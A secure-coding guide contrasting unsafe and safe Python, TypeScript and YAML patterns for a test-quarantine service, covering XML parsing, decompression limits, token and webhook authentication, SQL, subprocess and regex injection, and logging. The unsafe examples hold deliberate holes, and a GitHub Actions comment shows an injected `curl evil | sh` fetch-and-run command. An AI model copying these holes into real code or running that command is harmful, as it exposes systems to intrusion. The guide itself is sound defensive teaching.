# Security Code Examples — Unsafe vs Safe

Patterns for the flaky test quarantine system. Python unless noted.

---

## 1. Parsing uploaded JUnit XML

### UNSAFE — standard library parser on untrusted input

```python
import xml.etree.ElementTree as ET

def parse_junit(data: bytes):
    root = ET.fromstring(data)          # entity expansion ("billion laughs") and other XML attacks
    return [tc.attrib["name"] for tc in root.iter("testcase")]
```

### SAFE — defusedxml with limits

```python
from defusedxml import ElementTree as DET
from defusedxml import DefusedXmlException

MAX_TESTCASES = 50_000
MAX_TEXT = 64_000

def parse_junit(data: bytes) -> list[RawCase]:
    try:
        root = DET.fromstring(data, forbid_dtd=True)
    except (DefusedXmlException, DET.ParseError) as e:
        raise InvalidUpload(f"JUnit XML rejected: {type(e).__name__}") from e
    cases = []
    for i, tc in enumerate(root.iter("testcase")):
        if i >= MAX_TESTCASES:
            raise InvalidUpload("too many test cases")
        cases.append(RawCase.from_element(tc, max_text=MAX_TEXT))
    return cases
```

---

## 2. Decompressing gzip parts

### UNSAFE — unbounded

```python
data = gzip.decompress(part)            # a 1 MB part can expand to many GB
```

### SAFE — streaming with a cap

```python
import zlib

def gunzip_capped(blob: bytes, max_out: int) -> bytes:
    d = zlib.decompressobj(16 + zlib.MAX_WBITS)
    out = d.decompress(blob, max_out + 1)
    if len(out) > max_out or d.unconsumed_tail:
        raise UploadTooLarge("decompressed size over limit")
    return out
```

---

## 3. Repo token authentication

### UNSAFE — plain-text compare, fail-open, trusts body

```python
async def current_repo(authorization: str | None = Header(None), session=Depends(get_session)):
    if not authorization:
        return None                                   # "anonymous" — routes may forget to check
    token = authorization.removeprefix("Bearer ")
    return await session.scalar(select(Repository).where(Repository.token == token))  # plain text, timing leak

@router.post("/ingest/runs")
async def ingest(meta: Metadata, repo=Depends(current_repo)):
    repo_name = meta.repository                       # attacker picks the target repo
```

### SAFE — hashed, constant-time, fail-closed, bound to the token's repo

```python
def hash_token(token: str) -> str:
    return hashlib.sha256(token.encode()).hexdigest()

async def current_repo(authorization: str = Header(...), session=Depends(get_session)) -> Repository:
    scheme, _, token = authorization.partition(" ")
    if scheme != "Bearer" or not token:
        raise HTTPException(401, "invalid token")
    repo = await session.scalar(select(Repository).where(Repository.token_hash == hash_token(token)))
    if repo is None or not hmac.compare_digest(repo.token_hash, hash_token(token)):
        raise HTTPException(401, "invalid token")
    return repo

@router.post("/ingest/runs", status_code=202)
async def ingest(meta: Metadata, repo: Repository = Depends(current_repo)):
    if meta.repository != repo.full_name:
        raise HTTPException(403, "repository does not match token")
```

---

## 4. GitHub webhook signature

### UNSAFE — parses first, compares with ==

```python
@router.post("/webhooks/github")
async def github_hook(request: Request):
    payload = await request.json()                    # parsed before verification
    sig = request.headers.get("X-Hub-Signature-256", "")
    expected = "sha256=" + hmac.new(SECRET, json.dumps(payload).encode(), "sha256").hexdigest()  # re-serialized body
    if sig == expected:                               # timing leak
        await handle(payload)
```

### SAFE — raw body, constant time, then parse, then dedupe

```python
@router.post("/webhooks/github", status_code=204)
async def github_hook(request: Request, settings: Settings = Depends(get_settings)):
    body = await request.body()
    sig = request.headers.get("X-Hub-Signature-256", "")
    expected = "sha256=" + hmac.new(settings.github_webhook_secret.encode(), body, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(sig, expected):
        raise HTTPException(401, "bad signature")
    delivery = request.headers["X-GitHub-Delivery"]
    event = request.headers["X-GitHub-Event"]
    await enqueue_webhook(delivery_id=delivery, event=event, payload=json.loads(body))  # idempotent on delivery_id
```

---

## 5. SQL

### UNSAFE

```python
await session.execute(text(f"SELECT * FROM tests WHERE test_key = '{key}'"))
await session.execute(text(f"CREATE TABLE test_executions_{month} PARTITION OF ..."))   # month from input?
```

### SAFE

```python
await session.execute(select(Test).where(Test.test_key == key))

def partition_name(d: date) -> str:                    # built from a date object, never from input
    return f"test_executions_{d:%Y_%m}"
```

---

## 6. Running git / tools from fq-cli

### UNSAFE

```python
os.system(f"git show origin/{branch}:quarantine.yaml > q.yaml")      # branch name from CI env
subprocess.run(f"npx playwright test --grep '{pattern}'", shell=True)
```

### SAFE

```python
result = subprocess.run(
    ["git", "show", f"origin/{default_branch}:quarantine.yaml"],
    capture_output=True, check=False, text=True, timeout=30,
)
subprocess.run(["npx", "playwright", "test"], env={**os.environ, "FQ_QUARANTINE_FILE": str(qfile)}, check=False)
```

---

## 7. Building a selection regex from test titles (TypeScript)

### UNSAFE

```ts
const grepInvert = new RegExp(titles.join("|"));        // "pays (with) card?" changes meaning; catastrophic patterns possible
```

### SAFE

```ts
const escape = (s: string) => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
const grepInvert = titles.length ? new RegExp(`^(?:${titles.map(escape).join("|")})$`) : undefined;
// better still: read the list from FQ_QUARANTINE_FILE and match exact titles in a custom filter
```

---

## 8. GitHub Actions script injection (YAML)

### UNSAFE

```yaml
- run: echo "Testing ${{ github.event.pull_request.title }}"     # a title like `"; curl evil | sh; "` runs
```

### SAFE

```yaml
permissions:
  contents: read
steps:
  - uses: actions/checkout@<full-commit-sha>    # pinned by SHA
  - env:
      PR_TITLE: ${{ github.event.pull_request.title }}
    run: echo "Testing $PR_TITLE"
```

---

## 9. Logging and masking

### UNSAFE

```python
log.info("upload received", headers=dict(request.headers))            # Authorization header in logs
jira.create_issue(description=execution.raw_message)                   # unmasked stack trace into Jira
```

### SAFE

```python
log.info("upload_received", repo=repo.full_name, upload_id=upload.id, parts=len(files))
jira.create_issue(description=render_ticket(masked_message=execution.message_excerpt))  # masked at ingestion
```

---

## 10. Config and metadata validation (mass assignment)

### UNSAFE

```python
meta = json.loads(form["metadata"])
run = CiRun(**meta)                                    # any column can be set, e.g. is_environmental
```

### SAFE

```python
class Metadata(BaseModel):
    model_config = ConfigDict(extra="forbid")
    repository: str = Field(max_length=200)
    ci_system: Literal["github_actions", "jenkins"]
    run_id: str = Field(max_length=100)
    run_attempt: int = Field(ge=1, le=100)
    commit_sha: str = Field(pattern=r"^[0-9a-f]{7,40}$")
    # ... every field explicit

meta = Metadata.model_validate_json(form["metadata"])
run = CiRun(repository_id=repo.id, ci_system=meta.ci_system, run_id=meta.run_id, ...)
```
